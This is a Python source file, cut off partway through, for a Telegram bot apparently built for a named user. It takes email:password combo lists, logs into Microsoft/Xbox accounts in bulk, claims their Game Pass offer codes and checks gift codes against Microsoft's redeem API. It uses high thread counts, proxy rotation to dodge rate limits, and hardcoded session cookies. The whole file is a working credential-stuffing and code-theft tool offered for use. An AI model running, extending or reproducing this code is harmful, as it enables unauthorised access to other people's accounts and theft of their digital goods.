#!/usr/bin/env python3
"""
XBOX CODE FETCHER + VALIDATOR - TELEGRAM BOT EDITION
UNLOCKED VERSION FOR @vantrexXxx
"""

import requests
import re
import json
import time
import random
import string
import os
import sys
import queue
import uuid
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# Telegram Bot API Kütüphanesi
import telebot
from telebot import types

# Token'ı ortam değişkeninden alıyoruz (Railway için)
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ HATA: BOT_TOKEN ortam değişkeni bulunamadı!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

print_lock = Lock()
results_lock = Lock()

# Global Thread Ayarları
FETCH_THREADS = 50
VALIDATE_THREADS = 50
MAX_THREADS = 150

# Kullanıcı durumlarını takip etmek için basit bir hafıza sözlüğü
USER_STATES = {}

def get_user_data(user_id):
    if user_id not in USER_STATES:
        USER_STATES[user_id] = {
            'mode': None,
            'acc_file_path': None,
            'codes_file_path': None,
            'checker_acc_file_path': None,
            'proxies': [],
            'status': 'idle',
            'stats': {
                'total': 0,
                'checked': 0,
                'codes_found': 0,
                'valid': 0,
                'redeemed': 0,
                'invalid': 0,
                'error': 0
            }
        }
    return USER_STATES[user_id]

# ============================================================================
# ORIGINAL FETCHER & VALIDATOR CORE FUNCTIONS (UNTOUCHED)
# ============================================================================

MICROSOFT_OAUTH_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

def fetch_oauth_tokens(session):
    try:
        response = session.get(MICROSOFT_OAUTH_URL, timeout=10)
        text = response.text
        match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if not match: return (None, None)
        ppft = match.group(1)
        match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
        if not match: return (None, None)
        return (match.group(1), ppft)
    except:
        return (None, None)

def fetch_login(session, email, password, url_post, ppft):
    try:
        resp = session.post(url_post, data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft},
                           headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if '#' in resp.url:
            token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
            if token != 'None': return token
        if 'cancel?mkt=' in resp.text:
            ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
            pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
            uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
            if ipt and pprid and uaid and action:
                ret = session.post(action.group(), data={'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}, allow_redirects=True, timeout=10)
                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":")+.+?(?=",)', ret.text)
                if return_url:
                    fin = session.get(return_url.group(), allow_redirects=True, timeout=10)
                    if '#' in fin.url:
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                        if token != 'None': return token
        return None
    except:
        return None

def get_xbox_tokens(session, rps_token):
    try:
        resp = session.post('https://user.auth.xboxlive.com/user/authenticate',
            json={'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps_token}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200: return (None, None)
        user_token = resp.json().get('Token')
        
        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
            json={'RelyingParty': 'http://xboxlive.com', 'TokenType': 'JWT',
                  'Properties': {'UserTokens': [user_token], 'SandboxId': 'RETAIL'}},
            headers={'Content-Type': 'application/json'}, timeout=15)
        if resp.status_code != 200: return (None, None)
        data = resp.json()
        return (data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs'), data.get('Token'))
    except:
        return (None, None)

def fetch_codes_from_xbox(session, uhs, xsts_token):
    try:
        auth = f'XBL3.0 x={uhs};{xsts_token}'
        resp = session.get('https://profile.gamepass.com/v2/offers',
            headers={'Authorization': auth, 'Content-Type': 'application/json', 'User-Agent': 'okhttp/4.12.0'}, timeout=15)
        if resp.status_code != 200: return []
        
        codes = []
        for offer in resp.json().get('offers', []):
            resource = offer.get('resource')
            if resource:
                codes.append(resource)
            elif offer.get('offerStatus') == 'available':
                cv = ''.join(random.choices(string.ascii_letters + string.digits, k=22)) + '.0'
                claim_resp = session.post(f'https://profile.gamepass.com/v2/offers/{offer.get("offerId")}',
                    headers={'Authorization': auth, 'content-type': 'application/json', 'User-Agent': 'okhttp/4.12.0', 'ms-cv': cv, 'Content-Length': '0'},
                    data='', timeout=15)
                if claim_resp.status_code == 200:
                    code = claim_resp.json().get('resource')
                    if code: codes.append(code)
        return codes
    except:
        return []

def generate_reference_id():
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def get_random_proxy(proxies):
    if not proxies:
        return None
    proxy = random.choice(proxies)
    if proxy.count("@") >= 1:
        credentials, addr = proxy.split("@", 1)
        username, password = credentials.split(":", 1)
        proxy_url = f"http://{username}:{password}@{addr}"
    elif proxy.count(':') == 3:
        ip, port, username, password = proxy.split(':')
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
    else:
        proxy_url = f"http://{proxy}"
    
    return {
        'http': proxy_url,
        'https': proxy_url
    }

def login_microsoft_account(email, password, proxies=None):
    session = requests.Session()
    if proxies:
        session.proxies = proxies
    
    session.headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://account.microsoft.com/',
        'Origin': 'https://account.microsoft.com',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }
    
    try:    
        login_response = session.post(
            f"https://login.live.com/ppsecure/post.srf?username={email}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=1761964181&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none",
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$"},
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                "Cookie": "MSPRequ=id=N&lt=1761964181&co=1; uaid=f8aac2614ca54994b0bb9621af361fe6; MSCC=110.226.176.161-IN; MSPOK=$uuid-28da118b-591b-4245-a835-d6a7a6516fc6; OParams=11O.DtU8h4PuH7vnv3smo7N1*styCuvoTV2MRZi8wj4oQDgi!Mpw6KZwEGt9RgLvxFZ*vwFA!0!1OLGPdeGOwX9EAmOhMaLVWgPa3!lut3b6iSqLZwZ6wKNo48s9Glp9oJNYOJ!QdDvn9Zlz6yUfmGNA71N*7RJJ82DhAEUtv9cj3S5VSLPp*rLjsZw*T!eA4rT1OoHQfj!E0MpIMb7XTGunq0W296qtBwcXcMiKnoG1DOOam7ArRr9kSeVqb2OO3gQ8tBcGfef*aveFCKUAbkdjWuhRB4vYl2RmUA5yc967445z!g761lZOAEaXxAMTGxbEibxTneHDX4PpnqWIwURKn*igMH7p7LRvIUh0TPAO2ff6h793xvhtYi3SYKj4gT6KaajxfJ3fL0Ceb*308Ner9hi32b2GVnW81LmKcQLF343cM0KcKgRXBqkPdIJ3fS*4l8wFshd1kpI0elXVUgQ9A5a4tPKO46vh9k*luyC!RSNjzNs4oQKLFF1TXRB1LifVMLwKQ3aJTxxys!YvalzEB5q6TG*bKZ1FDBjFfpSIEVdfg8XMOBszi3TGeXJw*sg5zsSVv9Efpe3UfEvAgAr24Qk*fYd2G0FdzrNpxb9nntPSX*TYsh2k5EYuW9RD6qo!qtSh8EXzTq0WS6qII0*Tkn*NxydUx3WPbZ2fiOU*ulkS8TlhUKRRbNNTMeYIWl93GOeP9cIuXtFuZ3XZimHUgv86pjFVxKXeDCVQpyOjVUSL67AuADB0ukQBYlw7z48cv0Q5XlXX4umkZErVDo5f9W4uE1mTaav!WpKqighrUL2Me5Uqexr*RCtwpDu1f5W1ay0xmPoxx*W5lIIQUmKYua93KiFQsxnma3iHtSaH2tUeClZaWauWKkBt5xwyZ3ajhyWT4Ylw8lfDgf0RNWQhdrQ6EVtXowflqyiWC71dfjUDqVnSCzTcUuZCX*Hzkewo5G3LZczEm1MeuQRPMFisXNkf3KSBgzwqlyt8rHQrNYzuZRMTyO9WGt1RS1kTDs1XNu3PG8qA1HWTq7kwHvKeVblEr!!YGoUFWaWWsQqLa0Co7x83jzWgGDTOa3NFawXQGsA5snh7HsS01WqUHgCtHT9RKRegHay9aO813K5jayLc3UR9qO2mspBZhSKuaYPOoaNUeoF5ImgWitT*g1ogFFJl12AgfmtEVWDVhzmvtR1j7oNlvEE2g0fu0SMo!NTV3zbWjxfN!F1b6UxCV0uFT7QTf8yL2M4Lw8CnCTWa5N*jc2SSZe4O2SU*2HPHn0lYFOUkGGoXTe2pHGQiW0hA8jFnufIOzjTZ0VLEA7Z6QlW62lkpDEW9OXmUdqRmp225Ag$$"
            },
            allow_redirects=True,
            timeout=30
        )
        login_request = login_response.text.replace('\\', '')
            
        reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
        if not reurl_match:
            return None
            
        reurl = reurl_match.group(1)
        
        try:
            reresp = session.get(reurl, timeout=30).text
        except Exception:
            return None
            
        actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
        if not actch:
            return None
            
        acu = actch.group(1)
        input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
        fta = {name: value for name, value in input_matches}
        
        try:
            final_response = session.post(acu, data=fta, allow_redirects=True, timeout=30)
            if final_response.status_code != 200:
                return None
        except Exception:
            return None
        
        return session
        
    except Exception as e:
        return None

def get_auth_token(session, force_refresh=False):
    try:
        if not force_refresh and hasattr(session, 'wlid_token'):
            return session.wlid_token

        session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=10)

        token_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': 'https://account.microsoft.com/billing/redeem'
        }
        
        token_response = session.get(
            'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
            params={'scopes': 'MSComServiceMBISSL'},
            headers=token_headers,
            timeout=15
        )
        if token_response.status_code != 200:
            return None
            
        token_data = token_response.json()
        if not token_data or len(token_data) == 0:
            return None
            
        token = token_data[0]['token']
        session.wlid_token = token
        
        return token
        
    except Exception as e:
        return None

def get_store_cart_state(session, force_refresh=False):
    try:
        if force_refresh:
            if hasattr(session, 'store_state'):
                delattr(session, 'store_state')
                
        if not force_refresh and hasattr(session, 'store_state'):
            return session.store_state
            
        token = get_auth_token(session, force_refresh)
        if not token:
            return None
            
        ms_cv = f"xddT7qMNbECeJpTq.6.2"
        
        url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
        params = {
            'ms-cv': ms_cv,
            'market': 'US',
            'locale': 'en-GB',
            'clientName': 'AccountMicrosoftCom'
        }
        payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
        
        try:
            response = session.post(url, params=params, data=payload, timeout=30, allow_redirects=True)
        except Exception as e:
            return None
            
        text = response.text
        match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
        if not match:
            return None
            
        try:
            store_state = json.loads(match.group(1))
            extracted_values = {
                'ms_cv': store_state.get('appContext', {}).get('cv', ''),
                'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
                'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
                'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
                'muid': store_state.get('appContext', {}).get('muid', ''),
                'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
            }
            
            session.store_state = extracted_values
            return extracted_values
        except json.JSONDecodeError as e:
            return None
            
    except Exception as e:
        return None

def prepare_redeem_api_call(session, code, headers, payload):
    try:
        response = session.post(
            'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
            headers=headers,
            json=payload,
            timeout=30
        )
        return response
    except Exception as e:
        return None

def validate_code_primary(session, code, force_refresh_ids=False, prepare_redeem_executor=None):
    try:
        if not code or len(code) < 5 or ' ' in code or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
            return {"status": "INVALID", "message": "Invalid code format"}
            
        store_state = get_store_cart_state(session, force_refresh=force_refresh_ids)
        if not store_state:
            store_state = get_store_cart_state(session, force_refresh=True)
            if not store_state:
                return {"status": "ERROR", "message": "Failed to get store cart state"}
                
        token = get_auth_token(session, force_refresh=force_refresh_ids)
        if not token:
            token = get_auth_token(session, force_refresh=True)
            if not token:
                return {"status": "ERROR", "message": "Failed to get authentication token"}

        try:
            headers = {
                "host": "buynow.production.store-web.dynamics.com",
                "connection": "keep-alive",
                "x-ms-tracking-id": store_state['tracking_id'],
                "sec-ch-ua-platform": "\"Windows\"",
                "authorization": f"WLID1.0=t={token}",
                "x-ms-client-type": "AccountMicrosoftCom",
                "x-ms-market": "US",
                "sec-ch-ua": "\"Chromium\";v=\"142\", \"Microsoft Edge\";v=\"142\", \"Not_A Brand\";v=\"99\"",
                "ms-cv": store_state['ms_cv'],
                "sec-ch-ua-mobile": "?0",
                "x-ms-reference-id": generate_reference_id(),
                "x-ms-vector-id": store_state['vector_id'],
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
                "x-ms-correlation-id": store_state['correlation_id'],
                "content-type": "application/json",
                "x-authorization-muid": store_state['alternative_muid'],
                "accept": "*/*",
                "origin": "https://www.microsoft.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.microsoft.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            }

            payload = {
                "market": "US",
                "language": "en-US",
                "flights": [],
                "tokenString": code
            }

            if prepare_redeem_executor:
                future = prepare_redeem_executor.submit(prepare_redeem_api_call, session, code, headers, payload)
                response = future.result()
            else:
                response = session.post(
                    'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
                    headers=headers,
                    json=payload,
                    timeout=30
                )

            if not response:
                return {"status": "ERROR", "message": "No response from API"}

            if response.status_code == 200:
                res_json = response.json()
                token_info = res_json.get('tokenDefinition', {})
                if token_info:
                    game_name = token_info.get('title', 'Unknown Game')
                    return {"status": "VALID", "message": game_name}
                return {"status": "INVALID", "message": "Invalid token details structure"}

            elif response.status_code == 400:
                try:
                    err_json = response.json()
                    err_code = err_json.get('error', {}).get('code', '')
                    err_msg = err_json.get('error', {}).get('message', 'Bad Request')
                    
                    if err_code == 'TokenAlreadyRedeemed':
                        return {"status": "REDEEMED", "message": "Code already redeemed"}
                    elif err_code == 'TokenNotFound':
                        return {"status": "INVALID", "message": "Code not found / Invalid"}
                    return {"status": "INVALID", "message": f"{err_code}: {err_msg}"}
                except:
                    return {"status": "INVALID", "message": "Bad Request (400)"}

            elif response.status_code == 401:
                return {"status": "REFRESH_AUTH", "message": "Unauthorized (401)"}
            elif response.status_code == 409:
                return {"status": "REFRESH_AUTH", "message": "Conflict (409) - State mismatch"}
            else:
                return {"status": "ERROR", "message": f"HTTP {response.status_code}"}

        except Exception as e:
            return {"status": "ERROR", "message": f"Request exception: {str(e)}"}

    except Exception as e:
        return {"status": "ERROR", "message": f"Outer exception: {str(e)}"}


# ============================================================================
# WORKER ADAPTERS FOR TELEGRAM BOT WITH LIVE STATS UPDATE
# ============================================================================

def fetch_account_worker_tg(email, password, u_data, all_fetched_codes):
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    
    try:
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post: 
            with results_lock: u_data['stats']['error'] += 1
            return
        
        rps = fetch_login(session, email, password, url_post, ppft)
        if not rps:
            with results_lock: u_data['stats']['invalid'] += 1
            return
        
        uhs, xsts = get_xbox_tokens(session, rps)
        if not uhs:
            with results_lock: u_data['stats']['error'] += 1
            return
        
        codes = fetch_codes_from_xbox(session, uhs, xsts)
        with results_lock:
            u_data['stats']['checked'] += 1
            if codes:
                u_data['stats']['codes_found'] += len(codes)
                all_fetched_codes.extend(codes)
            else:
                u_data['stats']['valid'] += 1 # Kod olmayan ama aktif hesap
    except Exception:
        with results_lock: u_data['stats']['error'] += 1
    finally:
        session.close()

def validate_code_worker_tg(code, u_data, session_pool, results, prepare_redeem_executor=None):
    if not session_pool:
        with results_lock: u_data['stats']['error'] += 1
        return
        
    session_entry = random.choice(session_pool)
    session = session_entry['session']
    
    if u_data['proxies']:
        session.proxies = get_random_proxy(u_data['proxies'])
        
    res = validate_code_primary(session, code, force_refresh_ids=False, prepare_redeem_executor=prepare_redeem_executor)
    if res["status"] in ["REFRESH_AUTH", "ERROR"] and ("401" in res["message"] or "409" in res["message"] or "State mismatch" in res["message"]):
        res = validate_code_primary(session, code, force_refresh_ids=True, prepare_redeem_executor=prepare_redeem_executor)
        
    status = res["status"]
    msg = res["message"]
    
    with results_lock:
        u_data['stats']['checked'] += 1
        if status == "VALID":
            results["valid"].append((code, msg))
            u_data['stats']['valid'] += 1
        elif status == "REDEEMED":
            results["redeemed"].append(code)
            u_data['stats']['redeemed'] += 1
        elif status == "INVALID":
            results["invalid"].append(code)
            u_data['stats']['invalid'] += 1
        else:
            results["error"].append(code)
            u_data['stats']['error'] += 1

# Canlı Mesaj Güncelleyici (Her 5 Saniyede Bir)
def live_results_tracker(chat_id, message_id, u_data, stop_event, mode_text):
    while not stop_event.is_set():
        time.sleep(5)
        with results_lock:
            stats = u_data['stats']
            total = stats['total']
            checked = stats['checked']
            
            if mode_text == "FETCH":
                text = (
                    f"⚡ *XBOX FETCH STATUS* ⚡\n"
                    f"⚙️ Yetkili: `@vantrexXxx`\n\n"
                    f"📊 İlerleme: {checked}/{total}\n"
                    f"✅ Başarılı Hesap: {stats['valid']}\n"
                    f"❌ Başarısız Hesap: {stats['invalid']}\n"
                    f"⚠️ Hata Alınan: {stats['error']}\n\n"
                    f"🎁 *Bulunan Toplam Kod: {stats['codes_found']}*"
                )
            else:
                text = (
                    f"⚡ *XBOX VALIDATION STATUS* ⚡\n"
                    f"⚙️ Yetkili: `@vantrexXxx`\n\n"
                    f"📊 İlerleme: {checked}/{total}\n"
                    f"✅ AKTİF/VALİD: {stats['valid']}\n"
                    f"🟡 KULLANILMIŞ (Redeemed): {stats['redeemed']}\n"
                    f"❌ GEÇERSİZ (Invalid): {stats['invalid']}\n"
                    f"⚠️ Hata Alınan: {stats['error']}"
                )
        try:
            bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown")
        except:
            pass

# ============================================================================
# TELEGRAM BOT HANDLERS & FLOW MANAGEMENT
# ============================================================================

@bot.message_handler(commands=['start', 'menu'])
def send_welcome(message):
    u_data = get_user_data(message.from_user.id)
    u_data['status'] = 'idle'
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📥 [1] Fetch codes from accounts", callback_data="mode_1"),
        types.InlineKeyboardButton("🔍 [2] Validate existing codes", callback_data="mode_2"),
        types.InlineKeyboardButton("💥 [3] Fetch + Auto-Validate combo", callback_data="mode_3")
    )
    
    banner = (
        f"╔══════════════════════════════════════════╗\n"
        f"║   XBOX FETCH + VALIDATE  ⚡ TURBO BOT ⚡   \n"
        f"║         UNLOCKED FOR @vantrexXxx         \n"
        f"╚══════════════════════════════════════════╝\n\n"
        f"Lütfen çalıştırmak istediğiniz modu seçin:"
    )
    bot.send_message(message.chat.id, banner, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def handle_mode_selection(call):
    user_id = call.from_user.id
    u_data = get_user_data(user_id)
    mode = call.data.split("_")[1]
    u_data['mode'] = mode
    
    bot.answer_callback_query(call.id)
    
    if mode in ['1', '3']:
        u_data['status'] = 'waiting_acc_file'
        bot.send_message(call.message.chat.id, "📝 Lütfen Hesap dosyasını (`email:pass` formatında .txt) gönderin:")
    elif mode == '2':
        u_data['status'] = 'waiting_codes_file'
        bot.send_message(call.message.chat.id, "🔑 Lütfen Kontrol edilecek Kodlar dosyasını (.txt) gönderin:")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    user_id = message.from_user.id
    u_data = get_user_data(user_id)
    
    if u_data['status'] == 'idle':
        bot.send_message(message.chat.id, "❌ Lütfen önce menüden bir mod seçin! (/menu)")
        return

    # Dosya indirme işlemi
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    # Geçici dizine kaydet
    os.makedirs("tmp", exist_ok=True)
    local_path = f"tmp/{user_id}_{message.document.file_name}"
    with open(local_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    # Durum kontrolüne göre dosyayı ata
    if u_data['status'] == 'waiting_acc_file':
        u_data['acc_file_path'] = local_path
        if u_data['mode'] == '1':
            # Sadece fetch modu için doğrudan başlat
            ask_proxy_tg(message.chat.id, user_id)
        else:
            # Combo modunda checker account da lazım
            u_data['status'] = 'waiting_checker_file'
            bot.send_message(message.chat.id, "🎯 Şimdi de Checker Hesapları dosyasını (`email:pass` formatında .txt) gönderin:")
            
    elif u_data['status'] == 'waiting_codes_file':
        u_data['codes_file_path'] = local_path
        u_data['status'] = 'waiting_checker_file'
        bot.send_message(message.chat.id, "🎯 Şimdi de Checker Hesapları dosyasını (`email:pass` formatında .txt) gönderin:")
        
    elif u_data['status'] == 'waiting_checker_file':
        u_data['checker_acc_file_path'] = local_path
        ask_proxy_tg(message.chat.id, user_id)
        
    elif u_data['status'] == 'waiting_custom_proxy':
        u_data['proxies'] = load_proxies_from_file(local_path)
        bot.send_message(message.chat.id, f"✅ Toplam {len(u_data['proxies'])} proxy yüklendi.")
        start_processing_thread(message.chat.id, user_id)

def ask_proxy_tg(chat_id, user_id):
    u_data = get_user_data(user_id)
    if u_data['mode'] == '1':
        # Fetch modunda orijinal akışta proxy ayarı sorulmuyor, direkt başla
        u_data['proxies'] = []
        start_processing_thread(chat_id, user_id)
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🚫 [1] No proxies (Direct Connection)", callback_data="p_1"),
        types.InlineKeyboardButton("🌐 [2] Use default custom proxy file (.txt yükle)", callback_data="p_3")
    )
    bot.send_message(chat_id, "🌐 *PROXY SETTINGS*\nLütfen bir proxy seçeneği belirleyin:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("p_"))
def handle_proxy_selection(call):
    user_id = call.from_user.id
    u_data = get_user_data(user_id)
    choice = call.data.split("_")[1]
    
    bot.answer_callback_query(call.id)
    
    if choice == '1':
        u_data['proxies'] = []
        bot.send_message(call.message.chat.id, "⚠️ Proxysiz bağlantı kurulacak (Rate limit yiyebilirsiniz!).")
        start_processing_thread(call.message.chat.id, user_id)
    elif choice == '3':
        u_data['status'] = 'waiting_custom_proxy'
        bot.send_message(call.message.chat.id, "📂 Lütfen proxy listenizi içeren `.txt` dosyasını gönderin (IP:PORT veya USER:PASS@IP:PORT):")

def load_proxies_from_file(path):
    proxies = []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    proxies.append(line)
    except:
        pass
    return proxies

# İşlemi arka planda başlatma motoru
def start_processing_thread(chat_id, user_id):
    t = threading.Thread(target=process_core, args=(chat_id, user_id))
    t.daemon = True
    t.start()

# ============================================================================
# CORE PROCESSING EXECUTION (REFACTORED MAIN FROM CLI)
# ============================================================================

def process_core(chat_id, user_id):
    u_data = get_user_data(user_id)
    u_data['status'] = 'processing'
    
    # İstatistikleri sıfırla
    u_data['stats'] = {k: 0 for k in u_data['stats']}
    
    status_msg = bot.send_message(chat_id, "⏳ İşlem hazırlanıyor, lütfen bekleyin...", parse_mode="Markdown")
    
    stop_event = threading.Event()
    
    # ------------------------------------------------------------------------
    # MODE 1: FETCH CODES ONLY
    # ------------------------------------------------------------------------
    if u_data['mode'] == '1':
        with open(u_data['acc_file_path'], 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if ':' in l]
            
        if not lines:
            bot.send_message(chat_id, "❌ Dosyada geçerli hesap bulunamadı!")
            return
            
        u_data['stats']['total'] = len(lines)
        
        # Live Tracker Başlat
        tracker_t = threading.Thread(target=live_results_tracker, args=(chat_id, status_msg.message_id, u_data, stop_event, "FETCH"))
        tracker_t.start()
        
        all_fetched_codes = []
        with ThreadPoolExecutor(max_workers=FETCH_THREADS) as executor:
            futures = []
            for line in lines:
                email, password = line.split(':', 1)
                futures.append(executor.submit(fetch_account_worker_tg, email, password, u_data, all_fetched_codes))
            for future in as_completed(futures):
                pass
                
        stop_event.set()
        tracker_t.join()
        
        all_fetched_codes = list(set(all_fetched_codes))
        
        if all_fetched_codes:
            out_name = f"tmp/fetched_codes_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(out_name, 'w', encoding='utf-8') as out_f:
                for c in all_fetched_codes:
                    out_f.write(f"{c}\n")
            
            with open(out_name, 'rb') as document:
                bot.send_document(chat_id, document, caption=f"🎉 Başarıyla {len(all_fetched_codes)} benzersiz kod toplandı!\n⚙️ Yetkili: @vantrexXxx")
            try: os.remove(out_name) except: pass
        else:
            bot.send_message(chat_id, "⚠️ Hesaplardan hiç kod çekilemedi.")

    # ------------------------------------------------------------------------
    # MODE 2: VALIDATE CODES ONLY
    # ------------------------------------------------------------------------
    elif u_data['mode'] == '2':
        with open(u_data['codes_file_path'], 'r', encoding='utf-8', errors='ignore') as f:
            codes = [l.strip() for l in f if l.strip()]
        with open(u_data['checker_acc_file_path'], 'r', encoding='utf-8', errors='ignore') as f:
            checker_lines = [l.strip() for l in f if ':' in l]
            
        if not codes or not checker_lines:
            bot.send_message(chat_id, "❌ Kodlar veya Checker hesapları eksik!")
            return
            
        u_data['stats']['total'] = len(codes)
        bot.edit_message_text(f"⏳ {len(checker_lines)} Checker hesabına giriş yapılıyor...", chat_id, status_msg.message_id)
        
        session_pool = []
        for line in checker_lines:
            c_email, c_pass = line.split(':', 1)
            px = get_random_proxy(u_data['proxies']) if u_data['proxies'] else None
            sess = login_microsoft_account(c_email, c_pass, px)
            if sess:
                session_pool.append({'session': sess, 'email': c_email})
                
        if not session_pool:
            bot.send_message(chat_id, "❌ Giriş başarılı olan hiçbir checker hesabı bulunamadı. İşlem iptal edildi.")
            return
            
        # Live Tracker Başlat
        tracker_t = threading.Thread(target=live_results_tracker, args=(chat_id, status_msg.message_id, u_data, stop_event, "VALIDATE"))
        tracker_t.start()
        
        results = {"valid": [], "redeemed": [], "invalid": [], "error": []}
        prepare_redeem_executor = ThreadPoolExecutor(max_workers=VALIDATE_THREADS * 2)
        
        with ThreadPoolExecutor(max_workers=VALIDATE_THREADS) as executor:
            futures = []
            for code in codes:
                futures.append(executor.submit(validate_code_worker_tg, code, u_data, session_pool, results, prepare_redeem_executor))
            for future in as_completed(futures):
                pass
                
        prepare_redeem_executor.shutdown(wait=False)
        stop_event.set()
        tracker_t.join()
        
        send_tg_results(chat_id, user_id, results, len(codes))

    # ------------------------------------------------------------------------
    # MODE 3: COMBO (FETCH + AUTO-VALIDATE)
    # ------------------------------------------------------------------------
    elif u_data['mode'] == '3':
        with open(u_data['acc_file_path'], 'r', encoding='utf-8', errors='ignore') as f:
            acc_lines = [l.strip() for l in f if ':' in l]
        with open(u_data['checker_acc_file_path'], 'r', encoding='utf-8', errors='ignore') as f:
            checker_lines = [l.strip() for l in f if ':' in l]
            
        if not acc_lines or not checker_lines:
